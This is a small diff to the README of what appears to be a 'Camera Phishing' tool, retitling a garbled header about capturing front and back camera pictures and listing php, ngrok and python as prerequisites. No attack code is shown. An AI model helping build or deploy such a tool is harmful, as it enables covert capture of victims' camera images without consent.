@@ -1,4 +1,4 @@
-#MrEsfelurmge to take pictures from the front and back camera
+# Camera Phishing 
 
 This program requires php, ngrok and python! 
 Please install these prerequisites before running
